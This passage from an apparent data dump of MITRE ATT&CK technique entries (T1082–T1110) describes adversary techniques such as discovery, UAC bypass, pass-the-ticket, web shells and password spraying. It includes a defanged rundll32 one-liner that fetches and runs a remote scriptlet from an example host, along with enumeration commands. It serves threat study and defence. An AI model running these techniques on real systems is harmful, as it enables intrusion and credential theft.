                          'a system or service, or source code/binary files containing embedded passwords.\n'
                          '\n'
                          'It is possible to extract passwords from backups or saved virtual machines through '
                          '[Credential Dumping](https://attack.mitre.org/techniques/T1003). (Citation: CG 2014) '
                          'Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain '
                          'Controller. (Citation: SRD GPP)\n'
                          '\n'
                          'In cloud environments, authenticated user credentials are often stored in local '
                          'configuration and credential files. In some cases, these files can be copied and reused on '
                          'another machine or the contents can be read and then used to authenticate without needing '
                          'to copy any files. (Citation: Specter Ops - Cloud Credential Storage)\n'
                          '\n',
           'name': 'Credentials in Files',
           'platforms': ['Linux', 'macOS', 'Windows', 'AWS', 'GCP', 'Azure']},
 'T1082': {'attack_id': 'T1082',
           'categories': ['discovery'],
           'description': 'An adversary may attempt to get detailed information about the operating system and '
                          'hardware, including version, patches, hotfixes, service packs, and architecture. '
                          'Adversaries may use the information from [System Information '
                          'Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape '
                          'follow-on behaviors, including whether or not the adversary fully infects the target and/or '
                          'attempts specific actions.\n'
                          '\n'
                          '### Windows\n'
                          '\n'
                          'Example commands and utilities that obtain this information include <code>ver</code>, '
                          '[Systeminfo](https://attack.mitre.org/software/S0096), and <code>dir</code> within '
                          '[cmd](https://attack.mitre.org/software/S0106) for identifying information based on present '
                          'files and directories.\n'
                          '\n'
                          '### Mac\n'
                          '\n'
                          'On Mac, the <code>systemsetup</code> command gives a detailed breakdown of the system, but '
                          'it requires administrative privileges. Additionally, the <code>system_profiler</code> gives '
                          'a very detailed breakdown of configurations, firewall rules, mounted volumes, hardware, and '
                          'many other things without needing elevated permissions.\n'
                          '\n'
                          '### AWS\n'
                          '\n'
                          'In Amazon Web Services (AWS), the Application Discovery Service may be used by an adversary '
                          'to identify servers, virtual machines, software, and software dependencies '
                          'running.(Citation: Amazon System Discovery)\n'
                          '\n'
                          '### GCP\n'
                          '\n'
                          'On Google Cloud Platform (GCP) <code>GET /v1beta1/{parent=organizations/*}/assets</code> or '
                          '<code>POST /v1beta1/{parent=organizations/*}/assets:runDiscovery</code> may be used to list '
                          'an organizations cloud assets, or perform asset discovery on a cloud environment.(Citation: '
                          'Google Command Center Dashboard)\n'
                          '\n'
                          '### Azure\n'
                          '\n'
                          'In Azure, the API request <code>GET '
                          'https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Compute/virtualMachines/{vmName}?api-version=2019-03-01</code> '
                          'may be used to retrieve information about the model or instance view of a virtual '
                          'machine.(Citation: Microsoft Virutal Machine API)',
           'name': 'System Information Discovery',
           'platforms': ['Linux', 'macOS', 'Windows', 'AWS', 'GCP', 'Azure']},
 'T1083': {'attack_id': 'T1083',
           'categories': ['discovery'],
           'description': 'Adversaries may enumerate files and directories or may search in specific locations of a '
                          'host or network share for certain information within a file system. Adversaries may use the '
                          'information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) '
                          'during automated discovery to shape follow-on behaviors, including whether or not the '
                          'adversary fully infects the target and/or attempts specific actions.\n'
                          '\n'
                          '### Windows\n'
                          '\n'
                          'Example utilities used to obtain this information are <code>dir</code> and '
                          '<code>tree</code>. (Citation: Windows Commands JPCERT) Custom tools may also be used to '
                          'gather file and directory information and interact with the Windows API.\n'
                          '\n'
                          '### Mac and Linux\n'
                          '\n'
                          'In Mac and Linux, this kind of discovery is accomplished with the <code>ls</code>, '
                          '<code>find</code>, and <code>locate</code> commands.',
           'name': 'File and Directory Discovery',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1084': {'attack_id': 'T1084',
           'categories': ['persistence'],
           'description': 'Windows Management Instrumentation (WMI) can be used to install event filters, providers, '
                          'consumers, and bindings that execute code when a defined event occurs. Adversaries may use '
                          'the capabilities of WMI to subscribe to an event and execute arbitrary code when that event '
                          'occurs, providing persistence on a system. Adversaries may attempt to evade detection of '
                          'this technique by compiling WMI scripts into Windows Management Object (MOF) files (.mof '
                          'extension). (Citation: Dell WMI Persistence) Examples of events that may be subscribed to '
                          "are the wall clock time or the computer's uptime. (Citation: Kazanciyan 2014) Several "
                          'threat groups have reportedly used this technique to maintain persistence. (Citation: '
                          'Mandiant M-Trends 2015)',
           'name': 'Windows Management Instrumentation Event Subscription',
           'platforms': ['Windows']},
 'T1085': {'attack_id': 'T1085',
           'categories': ['defense-evasion', 'execution'],
           'description': 'The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take '
                          'advantage of this functionality to proxy execution of code to avoid triggering security '
                          'tools that may not monitor execution of the rundll32.exe process because of whitelists or '
                          'false positives from Windows using rundll32.exe for normal operations.\n'
                          '\n'
                          'Rundll32.exe can be used to execute Control Panel Item files (.cpl) through the '
                          'undocumented shell32.dll functions <code>Control_RunDLL</code> and '
                          '<code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to '
                          'execute. (Citation: Trend Micro CPL)\n'
                          '\n'
                          'Rundll32 can also been used to execute scripts such as JavaScript. This can be done using a '
                          'syntax similar to this: <code>rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication '
                          '";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  '
                          'This behavior has been seen used by malware such as Poweliks. (Citation: This is Security '
                          'Command Line Confusion)',
           'name': 'Rundll32',
           'platforms': ['Windows']},
 'T1086': {'attack_id': 'T1086',
           'categories': ['execution'],
           'description': 'PowerShell is a powerful interactive command-line interface and scripting environment '
                          'included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can '
                          'use PowerShell to perform a number of actions, including discovery of information and '
                          'execution of code. Examples include the Start-Process cmdlet which can be used to run an '
                          'executable and the Invoke-Command cmdlet which runs a command locally or on a remote '
                          'computer. \n'
                          '\n'
                          'PowerShell may also be used to download and run executables from the Internet, which can be '
                          'executed from disk or in memory without touching disk.\n'
                          '\n'
                          'Administrator permissions are required to use PowerShell to connect to remote systems.\n'
                          '\n'
                          'A number of PowerShell-based offensive testing tools are available, including '
                          '[Empire](https://attack.mitre.org/software/S0363),  PowerSploit, (Citation: Powersploit) '
                          'and PSAttack. (Citation: Github PSAttack)\n'
                          '\n'
                          'PowerShell commands/scripts can also be executed without directly invoking the '
                          "powershell.exe binary through interfaces to PowerShell's underlying "
                          'System.Management.Automation assembly exposed through the .NET framework and Windows Common '
                          'Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak '
                          'Offensive PS Dec 2015) (Citation: Microsoft PSfromCsharp APR 2014)',
           'name': 'PowerShell',
           'platforms': ['Windows']},
 'T1087': {'attack_id': 'T1087',
           'categories': ['discovery'],
           'description': 'Adversaries may attempt to get a listing of local system or domain accounts. \n'
                          '\n'
                          '### Windows\n'
                          '\n'
                          'Example commands that can acquire this information are <code>net user</code>, <code>net '
                          'group <groupname></code>, and <code>net localgroup <groupname></code> using the '
                          '[Net](https://attack.mitre.org/software/S0039) utility or through use of '
                          '[dsquery](https://attack.mitre.org/software/S0105). If adversaries attempt to identify the '
                          'primary user, currently logged in user, or set of users that commonly uses a system, '
                          '[System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) may apply.\n'
                          '\n'
                          '### Mac\n'
                          '\n'
                          'On Mac, groups can be enumerated through the <code>groups</code> and <code>id</code> '
                          'commands. In mac specifically, <code>dscl . list /Groups</code> and <code>dscacheutil -q '
                          'group</code> can also be used to enumerate groups and users.\n'
                          '\n'
                          '### Linux\n'
                          '\n'
                          'On Linux, local users can be enumerated through the use of the <code>/etc/passwd</code> '
                          'file which is world readable. In mac, this same file is only used in single-user mode in '
                          'addition to the <code>/etc/master.passwd</code> file.\n'
                          '\n'
                          'Also, groups can be enumerated through the <code>groups</code> and <code>id</code> '
                          'commands.\n'
                          '\n'
                          '### Office 365 and Azure AD\n'
                          '\n'
                          'With authenticated access there are several tools that can be used to find accounts. The '
                          '<code>Get-MsolRoleMember</code> PowerShell cmdlet can be used to obtain account names given '
                          'a role or permissions group.(Citation: Microsoft msolrolemember)(Citation: GitHub '
                          'Raindance)\n'
                          '\n'
                          'Azure CLI (AZ CLI) also provides an interface to obtain user accounts with authenticated '
                          'access to a domain. The command <code>az ad user list</code> will list all users within a '
                          'domain.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018) \n'
                          '\n'
                          'The <code>Get-GlobalAddressList</code> PowerShell cmdlet can be used to obtain email '
                          'addresses and accounts from a domain using an authenticated session.(Citation: Microsoft '
                          'getglobaladdresslist)(Citation: Black Hills Attacking Exchange MailSniper, 2016)',
           'name': 'Account Discovery',
           'platforms': ['Linux', 'macOS', 'Windows', 'Office 365', 'Azure AD']},
 'T1088': {'attack_id': 'T1088',
           'categories': ['defense-evasion', 'privilege-escalation'],
           'description': 'Windows User Account Control (UAC) allows a program to elevate its privileges to perform a '
                          'task under administrator-level permissions by prompting the user for confirmation. The '
                          'impact to the user ranges from denying the operation under high enforcement to allowing the '
                          'user to perform the action if they are in the local administrators group and click through '
                          'the prompt or allowing them to enter an administrator password to complete the action. '
                          '(Citation: TechNet How UAC Works)\n'
                          '\n'
                          'If the UAC protection level of a computer is set to anything but the highest level, certain '
                          'Windows programs are allowed to elevate privileges or execute some elevated COM objects '
                          'without prompting the user through the UAC notification box. (Citation: TechNet Inside UAC) '
                          '(Citation: MSDN COM Elevation) An example of this is use of rundll32.exe to load a '
                          'specifically crafted DLL which loads an auto-elevated COM object and performs a file '
                          'operation in a protected directory which would typically require elevated access. Malicious '
                          'software may also be injected into a trusted process to gain elevated privileges without '
                          'prompting a user. (Citation: Davidson Windows) Adversaries can use these techniques to '
                          'elevate privileges to administrator if the target process is unprotected.\n'
                          '\n'
                          'Many methods have been discovered to bypass UAC. The Github readme page for UACMe contains '
                          'an extensive list of methods (Citation: Github UACMe) that have been discovered and '
                          'implemented within UACMe, but may not be a comprehensive list of bypasses. Additional '
                          'bypass methods are regularly discovered and some used in the wild, such as:\n'
                          '\n'
                          '* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script. '
                          '(Citation: enigma0x3 Fileless UAC Bypass) (Citation: Fortinet Fareit)\n'
                          '\n'
                          'Another bypass is possible through some Lateral Movement techniques if credentials for an '
                          'account with administrator privileges are known, since UAC is a single system security '
                          'mechanism, and the privilege or integrity of a process running on one system will be '
                          'unknown on lateral systems and default to high integrity. (Citation: SANS UAC Bypass)',
           'name': 'Bypass User Account Control',
           'platforms': ['Windows']},
 'T1089': {'attack_id': 'T1089',
           'categories': ['defense-evasion'],
           'description': 'Adversaries may disable security tools to avoid possible detection of their tools and '
                          'activities. This can take the form of killing security software or event logging processes, '
                          'deleting Registry keys so that tools do not start at run time, or other methods to '
                          'interfere with security scanning or event reporting.',
           'name': 'Disabling Security Tools',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1090': {'attack_id': 'T1090',
           'categories': ['command-and-control', 'defense-evasion'],
           'description': 'Adversaries may use a connection proxy to direct network traffic between systems or act as '
                          'an intermediary for network communications to a command and control server to avoid direct '
                          'connections to their infrastructure. Many tools exist that enable traffic redirection '
                          'through proxies or port redirection, including '
                          '[HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend '
                          'Micro APT Attack Tools) Adversaries use these types of proxies to manage command and '
                          'control communications, to reduce the number of simultaneous outbound network connections, '
                          'to provide resiliency in the face of connection loss, or to ride over existing trusted '
                          'communications paths between victims to avoid suspicion.\n'
                          '\n'
                          'External connection proxies are used to mask the destination of C2 traffic and are '
                          'typically implemented with port redirectors. Compromised systems outside of the victim '
                          'environment may be used for these purposes, as well as purchased infrastructure such as '
                          'cloud-based resources or virtual private servers. Proxies may be chosen based on the low '
                          'likelihood that a connection to them from a compromised system would be investigated. '
                          'Victim systems would communicate directly with the external proxy on the internet and then '
                          'the proxy would forward communications to the C2 server.\n'
                          '\n'
                          'Internal connection proxies can be used to consolidate internal connections from '
                          'compromised systems. Adversaries may use a compromised internal system as a proxy in order '
                          'to conceal the true destination of C2 traffic. The proxy can redirect traffic from '
                          'compromised systems inside the network to an external C2 server making discovery of '
                          'malicious traffic difficult. Additionally, the network can be used to relay information '
                          'from one system to another in order to avoid broadcasting traffic to all systems.',
           'name': 'Connection Proxy',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1091': {'attack_id': 'T1091',
           'categories': ['lateral-movement', 'initial-access'],
           'description': 'Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, '
                          'by copying malware to removable media and taking advantage of Autorun features when the '
                          'media is inserted into a system and executes. In the case of Lateral Movement, this may '
                          'occur through modification of executable files stored on removable media or by copying '
                          'malware and renaming it to look like a legitimate file to trick users into executing it on '
                          'a separate system. In the case of Initial Access, this may occur through manual '
                          'manipulation of the media, modification of systems used to initially format the media, or '
                          "modification to the media's firmware itself.",
           'name': 'Replication Through Removable Media',
           'platforms': ['Windows']},
 'T1092': {'attack_id': 'T1092',
           'categories': ['command-and-control'],
           'description': 'Adversaries can perform command and control between compromised hosts on potentially '
                          'disconnected networks using removable media to transfer commands from system to system. '
                          'Both systems would need to be compromised, with the likelihood that an Internet-connected '
                          'system was compromised first and the second through lateral movement by [Replication '
                          'Through Removable Media](https://attack.mitre.org/techniques/T1091). Commands and files '
                          'would be relayed from the disconnected system to the Internet-connected system to which the '
                          'adversary has direct access.',
           'name': 'Communication Through Removable Media',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1093': {'attack_id': 'T1093',
           'categories': ['defense-evasion'],
           'description': 'Process hollowing occurs when a process is created in a suspended state then its memory is '
                          'unmapped and replaced with malicious code. Similar to [Process '
                          'Injection](https://attack.mitre.org/techniques/T1055), execution of the malicious code is '
                          'masked under a legitimate process and may evade defenses and detection analysis. (Citation: '
                          'Leitch Hollowing) (Citation: Endgame Process Injection July 2017)',
           'name': 'Process Hollowing',
           'platforms': ['Windows']},
 'T1094': {'attack_id': 'T1094',
           'categories': ['command-and-control'],
           'description': 'Adversaries may communicate using a custom command and control protocol instead of '
                          'encapsulating commands/data in an existing [Standard Application Layer '
                          'Protocol](https://attack.mitre.org/techniques/T1071). Implementations include mimicking '
                          'well-known protocols or developing custom protocols (including raw sockets) on top of '
                          'fundamental protocols provided by TCP/IP/another standard network stack.',
           'name': 'Custom Command and Control Protocol',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1095': {'attack_id': 'T1095',
           'categories': ['command-and-control'],
           'description': 'Use of a standard non-application layer protocol for communication between host and C2 '
                          'server or among infected hosts within a network. The list of possible protocols is '
                          'extensive. (Citation: Wikipedia OSI) Specific examples include use of network layer '
                          'protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, '
                          'such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure '
                          '(SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n'
                          '\n'
                          'ICMP communication between hosts is one example. Because ICMP is part of the Internet '
                          'Protocol Suite, it is required to be implemented by all IP-compatible hosts; (Citation: '
                          'Microsoft ICMP) however, it is not as commonly monitored as other Internet Protocols such '
                          'as TCP or UDP and may be used by adversaries to hide communications.',
           'name': 'Standard Non-Application Layer Protocol',
           'platforms': ['Windows', 'Linux', 'macOS']},
 'T1096': {'attack_id': 'T1096',
           'categories': ['defense-evasion'],
           'description': 'Every New Technology File System (NTFS) formatted partition contains a Master File Table '
                          '(MFT) that maintains a record for every file/directory on the partition. (Citation: '
                          'SpectorOps Host-Based Jul 2017) Within MFT entries are file attributes, (Citation: '
                          'Microsoft NTFS File Attributes Aug 2010) such as Extended Attributes (EA) and Data [known '
                          'as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be '
                          'used to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based '
                          'Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) '
                          '(Citation: Microsoft ADS Mar 2014)\n'
                          '\n'
                          'Adversaries may store malicious data or binaries in file attribute metadata instead of '
                          'directly in files. This may be done to evade some defenses, such as static indicator '
                          'scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA) (Citation: '
                          'MalwareBytes ADS July 2015)',
           'name': 'NTFS File Attributes',
           'platforms': ['Windows']},
 'T1097': {'attack_id': 'T1097',
           'categories': ['lateral-movement'],
           'description': 'Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets '
                          "without having access to an account's password. Kerberos authentication can be used as the "
                          'first step to lateral movement to a remote system.\n'
                          '\n'
                          'In this technique, valid Kerberos tickets for [Valid '
                          'Accounts](https://attack.mitre.org/techniques/T1078) are captured by [Credential '
                          "Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket "
                          'granting ticket (TGT) may be obtained, depending on the level of access. A service ticket '
                          'allows for access to a particular resource, whereas a TGT can be used to request service '
                          'tickets from the Ticket Granting Service (TGS) to access any resource the user has '
                          'privileges to access. (Citation: ADSecurity AD Kerberos Attacks) (Citation: GentilKiwi Pass '
                          'the Ticket)\n'
                          '\n'
                          'Silver Tickets can be obtained for services that use Kerberos as an authentication '
                          'mechanism and are used to generate tickets to access that particular resource and the '
                          'system that hosts the resource (e.g., SharePoint). (Citation: ADSecurity AD Kerberos '
                          'Attacks)\n'
                          '\n'
                          'Golden Tickets can be obtained for the domain using the Key Distribution Service account '
                          'KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active '
                          'Directory. (Citation: Campbell 2014)',
           'name': 'Pass the Ticket',
           'platforms': ['Windows']},
 'T1098': {'attack_id': 'T1098',
           'categories': ['credential-access', 'persistence'],
           'description': 'Account manipulation may aid adversaries in maintaining access to credentials and certain '
                          'permission levels within an environment. Manipulation could consist of modifying '
                          'permissions, modifying credentials, adding or changing permission groups, modifying account '
                          'settings, or modifying how authentication is performed. These actions could also include '
                          'account activity designed to subvert security policies, such as performing iterative '
                          'password updates to subvert password duration policies and preserve the life of compromised '
                          'credentials. In order to create or manipulate accounts, the adversary must already have '
                          'sufficient permissions on systems or the domain.\n'
                          '\n'
                          '### Exchange Email Account Takeover\n'
                          '\n'
                          'The Add-MailboxPermission PowerShell cmdlet, available in on-premises Exchange and in the '
                          'cloud-based service Office 365, adds permissions to a mailbox.(Citation: Microsoft - '
                          'Add-MailboxPermission) This command can be run, given adequate permissions, to further '
                          'access granted to certain user accounts. This may be used in persistent threat incidents as '
                          'well as BEC (Business Email Compromise) incidents where an adversary can assign more access '
                          'rights to the accounts they wish to compromise. This may further enable use of additional '
                          'techniques for gaining access to systems. For example, compromised business accounts are '
                          'often used to send messages to other accounts in the network of the target business while '
                          'creating inbox rules so the messages evade spam/phishing detection mechanisms.(Citation: '
                          'Bienstock, D. - Defending O365 - 2019)\n'
                          '\n'
                          '### Azure AD\n'
                          '\n'
                          'In Azure, an adversary can set a second password for Service Principals, facilitating '
                          'persistence.(Citation: Blue Cloud of Death)\n'
                          '\n'
                          '### AWS\n'
                          '\n'
                          'AWS policies allow trust between accounts by simply identifying the account name. It is '
                          'then up to the trusted account to only allow the correct roles to have access.(Citation: '
                          'Summit Route Advanced AWS policy auditing)',
           'name': 'Account Manipulation',
           'platforms': ['Windows', 'Office 365', 'Azure', 'GCP', 'Azure AD', 'AWS']},
 'T1099': {'attack_id': 'T1099',
           'categories': ['defense-evasion'],
           'description': 'Timestomping is a technique that modifies the timestamps of a file (the modify, access, '
                          'create, and change times), often to mimic files that are in the same folder. This is done, '
                          'for example, on files that have been modified or created by the adversary so that they do '
                          'not appear conspicuous to forensic investigators or file analysis tools. Timestomping may '
                          'be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to '
                          'hide malware and tools. (Citation: WindowsIR Anti-Forensic Techniques)',
           'name': 'Timestomp',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1100': {'attack_id': 'T1100',
           'categories': ['persistence', 'privilege-escalation'],
           'description': 'A Web shell is a Web script that is placed on an openly accessible Web server to allow an '
                          'adversary to use the Web server as a gateway into a network. A Web shell may provide a set '
                          'of functions to execute or a command-line interface on the system that hosts the Web '
                          'server. In addition to a server-side script, a Web shell may have a client interface '
                          'program that is used to talk to the Web server (see, for example, China Chopper Web shell '
                          'client). (Citation: Lee 2013)\n'
                          '\n'
                          'Web shells may serve as [Redundant Access](https://attack.mitre.org/techniques/T1108) or as '
                          "a persistence mechanism in case an adversary's primary access methods are detected and "
                          'removed.',
           'name': 'Web Shell',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1101': {'attack_id': 'T1101',
           'categories': ['persistence'],
           'description': 'Windows Security Support Provider (SSP) DLLs are loaded into the Local Security Authority '
                          '(LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted '
                          "and plaintext passwords that are stored in Windows, such as any logged-on user's Domain "
                          'password or smart card PINs. The SSP configuration is stored in two Registry keys: '
                          '<code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and '
                          '<code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An '
                          'adversary may modify these Registry keys to add new SSPs, which will be loaded the next '
                          'time the system boots, or when the AddSecurityPackage Windows API function is called.\n'
                          ' (Citation: Graeber 2014)',
           'name': 'Security Support Provider',
           'platforms': ['Windows']},
 'T1102': {'attack_id': 'T1102',
           'categories': ['command-and-control', 'defense-evasion'],
           'description': 'Adversaries may use an existing, legitimate external Web service as a means for relaying '
                          'commands to a compromised system.\n'
                          '\n'
                          'These commands may also include pointers to command and control (C2) infrastructure. '
                          'Adversaries may post content, known as a dead drop resolver, on Web services with embedded '
                          '(and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach '
                          'out to and be redirected by these resolvers.\n'
                          '\n'
                          'Popular websites and social media acting as a mechanism for C2 may give a significant '
                          'amount of cover due to the likelihood that hosts within a network are already communicating '
                          'with them prior to a compromise. Using common services, such as those offered by Google or '
                          'Twitter, makes it easier for adversaries to hide in expected noise. Web service providers '
                          'commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n'
                          '\n'
                          'Use of Web services may also protect back-end C2 infrastructure from discovery through '
                          'malware binary analysis while also enabling operational resiliency (since this '
                          'infrastructure may be dynamically changed).',
           'name': 'Web Service',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1103': {'attack_id': 'T1103',
           'categories': ['persistence', 'privilege-escalation'],
           'description': 'Dynamic-link libraries (DLLs) that are specified in the AppInit_DLLs value in the Registry '
                          'keys <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows '
                          'NT\\CurrentVersion\\Windows</code> or '
                          '<code>HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows '
                          'NT\\CurrentVersion\\Windows</code> are loaded by user32.dll into every process that loads '
                          'user32.dll. In practice this is nearly every program, since user32.dll is a very common '
                          'library. (Citation: Endgame Process Injection July 2017) Similar to [Process '
                          'Injection](https://attack.mitre.org/techniques/T1055), these values can be abused to obtain '
                          'persistence and privilege escalation by causing a malicious DLL to be loaded and run in the '
                          'context of separate processes on the computer. (Citation: AppInit Registry)\n'
                          '\n'
                          'The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot '
                          'is enabled. (Citation: AppInit Secure Boot)',
           'name': 'AppInit DLLs',
           'platforms': ['Windows']},
 'T1104': {'attack_id': 'T1104',
           'categories': ['command-and-control'],
           'description': 'Adversaries may create multiple stages for command and control that are employed under '
                          'different conditions or for certain functions. Use of multiple stages may obfuscate the '
                          'command and control channel to make detection more difficult.\n'
                          '\n'
                          'Remote access tools will call back to the first-stage command and control server for '
                          'instructions. The first stage may have automated capabilities to collect basic host '
                          'information, update tools, and upload additional files. A second remote access tool (RAT) '
                          'could be uploaded at that point to redirect the host to the second-stage command and '
                          'control server. The second stage will likely be more fully featured and allow the adversary '
                          'to interact with the system through a reverse shell and additional RAT features.\n'
                          '\n'
                          'The different stages will likely be hosted separately with no overlapping infrastructure. '
                          'The loader may also have backup first-stage callbacks or [Fallback '
                          'Channels](https://attack.mitre.org/techniques/T1008) in case the original first-stage '
                          'communication path is discovered and blocked.',
           'name': 'Multi-Stage Channels',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1105': {'attack_id': 'T1105',
           'categories': ['command-and-control', 'lateral-movement'],
           'description': 'Files may be copied from one system to another to stage adversary tools or other files over '
                          'the course of an operation. Files may be copied from an external adversary-controlled '
                          'system through the Command and Control channel to bring tools into the victim network or '
                          'through alternate protocols with another tool such as '
                          '[FTP](https://attack.mitre.org/software/S0095). Files can also be copied over on Mac and '
                          'Linux with native tools like scp, rsync, and sftp.\n'
                          '\n'
                          'Adversaries may also copy files laterally between internal victim systems to support '
                          'Lateral Movement with remote Execution using inherent file sharing protocols such as file '
                          'sharing over SMB to connected network shares or with authenticated connections with '
                          '[Windows Admin Shares](https://attack.mitre.org/techniques/T1077) or [Remote Desktop '
                          'Protocol](https://attack.mitre.org/techniques/T1076).',
           'name': 'Remote File Copy',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1106': {'attack_id': 'T1106',
           'categories': ['execution'],
           'description': 'Adversary tools may directly use the Windows application programming interface (API) to '
                          'execute binaries. Functions such as the Windows API CreateProcess will allow programs and '
                          'scripts to start other processes with proper path and argument parameters. (Citation: '
                          'Microsoft CreateProcess)\n'
                          '\n'
                          'Additional Windows API calls that can be used to execute binaries include: (Citation: '
                          'Kanthak Verifier)\n'
                          '\n'
                          '* CreateProcessA() and CreateProcessW(),\n'
                          '* CreateProcessAsUserA() and CreateProcessAsUserW(),\n'
                          '* CreateProcessInternalA() and CreateProcessInternalW(),\n'
                          '* CreateProcessWithLogonW(), CreateProcessWithTokenW(),\n'
                          '* LoadLibraryA() and LoadLibraryW(),\n'
                          '* LoadLibraryExA() and LoadLibraryExW(),\n'
                          '* LoadModule(),\n'
                          '* LoadPackagedLibrary(),\n'
                          '* WinExec(),\n'
                          '* ShellExecuteA() and ShellExecuteW(),\n'
                          '* ShellExecuteExA() and ShellExecuteExW()',
           'name': 'Execution through API',
           'platforms': ['Windows']},
 'T1107': {'attack_id': 'T1107',
           'categories': ['defense-evasion'],
           'description': 'Malware, tools, or other non-native files dropped or created on a system by an adversary '
                          'may leave traces behind as to what was done within a network and how. Adversaries may '
                          'remove these files over the course of an intrusion to keep their footprint low or remove '
                          'them at the end as part of the post-intrusion cleanup process.\n'
                          '\n'
                          'There are tools available from the host operating system to perform cleanup, but '
                          'adversaries may use other tools as well. Examples include native '
                          '[cmd](https://attack.mitre.org/software/S0106) functions such as DEL, secure deletion tools '
                          'such as Windows Sysinternals SDelete, or other third-party file deletion tools. (Citation: '
                          'Trend Micro APT Attack Tools)',
           'name': 'File Deletion',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1108': {'attack_id': 'T1108',
           'categories': ['defense-evasion', 'persistence'],
           'description': 'Adversaries may use more than one remote access tool with varying command and control '
                          'protocols or credentialed access to remote services so they can maintain access if an '
                          'access mechanism is detected or mitigated. \n'
                          '\n'
                          'If one type of tool is detected and blocked or removed as a response but the organization '
                          "did not gain a full understanding of the adversary's tools and access, then the adversary "
                          'will be able to retain access to the network. Adversaries may also attempt to gain access '
                          'to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use [External Remote '
                          'Services](https://attack.mitre.org/techniques/T1133) such as external VPNs as a way to '
                          'maintain access despite interruptions to remote access tools deployed within a target '
                          'network.(Citation: Mandiant APT1) Adversaries may also retain access through cloud-based '
                          'infrastructure and applications.\n'
                          '\n'
                          'Use of a [Web Shell](https://attack.mitre.org/techniques/T1100) is one such way to maintain '
                          'access to a network through an externally accessible Web server.',
           'name': 'Redundant Access',
           'platforms': ['Linux', 'macOS', 'Windows', 'AWS', 'GCP', 'Azure', 'Office 365', 'SaaS', 'Azure AD']},
 'T1109': {'attack_id': 'T1109',
           'categories': ['defense-evasion', 'persistence'],
           'description': 'Some adversaries may employ sophisticated means to compromise computer components and '
                          'install malicious firmware that will execute adversary code outside of the operating system '
                          'and main system firmware or BIOS. This technique may be similar to [System '
                          'Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system '
                          'components that may not have the same capability or level of integrity checking. Malicious '
                          'device firmware could provide both a persistent level of access to systems despite '
                          'potential typical failures to maintain access and hard disk re-images, as well as a way to '
                          'evade host software-based defenses and integrity checks.',
           'name': 'Component Firmware',
           'platforms': ['Windows']},
 'T1110': {'attack_id': 'T1110',
           'categories': ['credential-access'],
           'description': 'Adversaries may use brute force techniques to attempt access to accounts when passwords are '
                          'unknown or when password hashes are obtained.\n'
                          '\n'
                          '[Credential Dumping](https://attack.mitre.org/techniques/T1003) is used to obtain password '
                          'hashes, this may only get an adversary so far when [Pass the '
                          'Hash](https://attack.mitre.org/techniques/T1075) is not an option. Techniques to '
                          'systematically guess the passwords used to compute hashes are available, or the adversary '
                          'may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on '
                          'adversary-controlled systems outside of the target network. (Citation: Wikipedia Password '
                          'cracking)\n'
                          '\n'
                          'Adversaries may attempt to brute force logins without knowledge of passwords or hashes '
                          'during an operation either with zero knowledge or by attempting a list of known or possible '
                          'passwords. This is a riskier option because it could cause numerous authentication failures '
                          "and account lockouts, depending on the organization's login failure policies. (Citation: "
                          'Cylance Cleaver)\n'
                          '\n'
                          "A related technique called password spraying uses one password (e.g. 'Password01'), or a "
                          'small list of passwords, that matches the complexity policy of the domain and may be a '
                          'commonly used password. Logins are attempted with that password and many different accounts '
                          'on a network to avoid account lockouts that would normally occur when brute forcing a '
                          'single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)\n'
                          '\n'
                          'Typically, management services over commonly used ports are used when password spraying. '
                          'Commonly targeted services include the following:\n'
                          '\n'
                          '* SSH (22/TCP)\n'
                          '* Telnet (23/TCP)\n'
                          '* FTP (21/TCP)\n'
